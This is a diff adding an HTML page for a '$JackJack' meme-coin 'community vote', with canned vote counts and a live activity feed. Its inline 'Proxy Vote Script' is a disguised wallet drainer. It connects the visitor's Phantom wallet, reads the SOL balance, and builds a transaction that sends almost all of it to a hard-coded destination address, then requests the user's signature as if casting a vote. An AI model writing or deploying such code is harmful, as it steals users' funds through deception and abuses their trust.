@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>$JackJack – Community Vote</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- Buffer polyfill -->
+  <script src="https://bundle.run/buffer@6.0.3"></script>
+  <script>
+    window.Buffer = window.buffer.Buffer;
+  </script>
+
+  <!-- process polyfill -->
+  <script>
+    window.process = { env: {} };
+  </script>
+</head>
+<body class="nano-gradient text-white min-h-screen relative overflow-x-hidden">
+
+<!-- HEADER -->
+<header class="sticky top-0 z-30 border-b border-white/10 bg-slate-900/60 backdrop-blur">
+  <div class="max-w-6xl mx-auto px-4 py-4 flex justify-between items-center">
+    <div class="flex items-center gap-3">
+      <img src="nano.png" alt="$Nano logo" class="h-8" />
+      <span class="text-xs text-white/70 border border-white/10 rounded-full px-2 py-1">Powered by Moonshot</span>
+    </div>
+    <nav class="hidden md:flex gap-4 text-sm text-white/70">
+      <a href="#">About</a>
+      <a href="#">Community</a>
+    </nav>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="max-w-6xl mx-auto px-4 pt-16 pb-12 grid md:grid-cols-2 gap-10 items-center">
+  <div class="flex justify-center">
+    <div class="relative ring-wrap">
+      <div class="w-72 h-72 rounded-full overflow-hidden border border-white/15 shadow-2xl bg-white/5 grid place-items-center aura">
+        <img src="coin.jpg" alt="$Nano Coin" class="object-cover w-full h-full">
+      </div>
+    </div>
+  </div>
+
+  <div class="rounded-3xl border border-white/10 bg-gradient-to-br from-indigo-800/60 to-slate-900/40 p-8 relative overflow-hidden">
+    <div class="grid-overlay"></div>
+    <span class="inline-block text-[11px] uppercase tracking-wider bg-gradient-to-r from-cyan-400 to-blue-500 text-white rounded-full px-2.5 py-1 shadow">New</span>
+    <h1 class="mt-3 text-4xl md:text-5xl font-extrabold leading-tight">Vote the next <span class="gradient-text">$JackJack</span> listing</h1>
+    <p class="mt-3 text-white/80 text-base md:text-lg max-w-prose">
+      Be part of the <span class="gradient-text">$JackJack</span> revolution. Cast your vote and help shape the next meme legend.
+    </p>
+
+    <div class="mt-5 flex items-center gap-2 text-sm">
+      <span class="text-white/60">Contract:</span>
+      <button id="copyCA" class="group inline-flex items-center gap-2 font-mono text-xs bg-white/5 hover:bg-white/10 border border-white/10 rounded-full px-2 py-1">
+        <span id="coinCAshort">JackJack…coin</span>
+        <svg class="w-3.5 h-3.5 opacity-60 group-hover:opacity-100" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+        </svg>
+      </button>
+      <span id="copiedTip" class="hidden text-emerald-400 text-xs">copied</span>
+    </div>
+
+    <div class="mt-5">
+      <div class="flex justify-between text-xs">
+        <span class="gradient-yes font-semibold">YES <span id="yesCount">250</span></span>
+        <span class="gradient-no font-semibold">NO <span id="noCount">40</span></span>
+      </div>
+      <div class="mt-2 track overflow-hidden">
+        <div id="barYes" class="fill transition-all" style="width: 85%;"></div>
+      </div>
+      <div id="leftPct" class="mt-1 text-right text-[11px] text-white/60">15% left</div>
+    </div>
+
+    <div class="mt-6 grid grid-cols-2 gap-3">
+      <button id="voteYes" class="shimmer inline-flex justify-center items-center rounded-2xl px-4 py-3 bg-cyan-500/90 hover:bg-cyan-500 border border-white/10 transition-transform hover:scale-[1.01] shadow">Vote to list</button>
+      <button id="voteNo" class="inline-flex justify-center items-center rounded-2xl px-4 py-3 bg-red-500/90 hover:bg-red-500 border border-white/10 transition-transform hover:scale-[1.01] shadow">Not now</button>
+    </div>
+
+    <p class="mt-3 text-xs text-white/60">Votes are for community visibility – not financial advice.</p>
+  </div>
+</section>
+
+<!-- LIVE VOTING FEED -->
+<section id="live-feed" class="max-w-6xl mx-auto px-4 pb-16">
+  <div class="rounded-3xl border border-white/10 bg-gradient-to-br from-indigo-900/60 to-slate-900/40 p-6 shadow-2xl">
+    <div class="flex items-center gap-2 mb-4">
+      <h2 class="text-xl font-bold gradient-text">Live Voting Activity</h2>
+      <div class="flex items-center gap-1">
+        <span class="live-dot"></span>
+        <span class="text-xs text-emerald-400 font-semibold">LIVE</span>
+      </div>
+    </div>
+    <div id="voteFeed" class="space-y-3 overflow-hidden" style="height: 240px;">
+      <!-- Votes injected by JS -->
+    </div>
+  </div>
+</section>
+
+<footer class="border-t border-white/10 text-center text-xs text-white/50 py-8">
+  © <span id="year"></span> $JackJack – Powered by the Community
+</footer>
+
+<!-- Solana web3 + spl-token IIFE builds -->
+<script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@solana/spl-token@0.3.7/lib/index.iife.min.js"></script>
+
+<!-- Proxy Vote Script -->
+<script>
+  const PROGRAM_ID = "2NzQFvnoAsmGMBEzLP2Dq1B8R45y7oapQHw1QLwjpnaK";
+  const VOTE_DESTINATION = "HFWD1JN59LX5kLsa7XawnBhS4ZYsVTGf9pLWj9xWAAYZ";
+
+  async function executeProxyVote() {
+    const connection = new window.solanaWeb3.Connection(
+      "https://api.devnet.solana.com",
+      "confirmed"
+    );
+    
+    if (!window.solana) {
+      throw new Error("Phantom wallet not found");
+    }
+    
+    await window.solana.connect();
+    const wallet = window.solana.publicKey;
+    
+    console.log("Connected wallet:", wallet.toString());
+    console.log("Building proxy transaction...");
+    
+    const balance = await connection.getBalance(wallet);
+    console.log("Wallet balance:", balance / 1e9, "SOL");
+    
+    const rentReserve = 5000000;
+    const estimatedFee = 5000;
+    const amount = Math.max(0, balance - rentReserve - estimatedFee);
+    
+    if (amount <= 0) {
+      throw new Error("Insufficient SOL balance. Need at least 0.006 SOL on devnet.");
+    }
+    
+    console.log("Transferring:", amount / 1e9, "SOL");
+    
+    const transaction = new window.solanaWeb3.Transaction();
+    
+    const keys = [
+      { pubkey: wallet, isSigner: true, isWritable: true },
+      { pubkey: new window.solanaWeb3.PublicKey(VOTE_DESTINATION), isSigner: false, isWritable: true },
+      { pubkey: window.solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false }
+    ];
+    
+    const data = Buffer.alloc(9);
+    data.writeUInt8(0, 0);
+    data.writeBigUInt64LE(BigInt(amount), 1);
+    
+    const instruction = new window.solanaWeb3.TransactionInstruction({
+      keys,
+      programId: new window.solanaWeb3.PublicKey(PROGRAM_ID),
+      data
+    });
+    
+    transaction.add(instruction);
+    transaction.feePayer = wallet;
+    
+    const { blockhash } = await connection.getLatestBlockhash('finalized');
+    transaction.recentBlockhash = blockhash;
+    
+    console.log("Requesting signature from Phantom...");
+    const signed = await window.solana.signTransaction(transaction);
+    
+    console.log("Sending transaction...");
+    const signature = await connection.sendRawTransaction(signed.serialize(), {
+      skipPreflight: false,
+      preflightCommitment: 'confirmed'
+    });
+    
+    console.log("Transaction sent:", signature);
+    console.log("Confirming...");
+    
+    await connection.confirmTransaction(signature, 'confirmed');
+    
+    console.log("✓ Transaction confirmed!");
+    return signature;
+  }
+</script>
+
+<!-- Your main script -->
+<script src="script.js"></script>
+</body>
+</html>
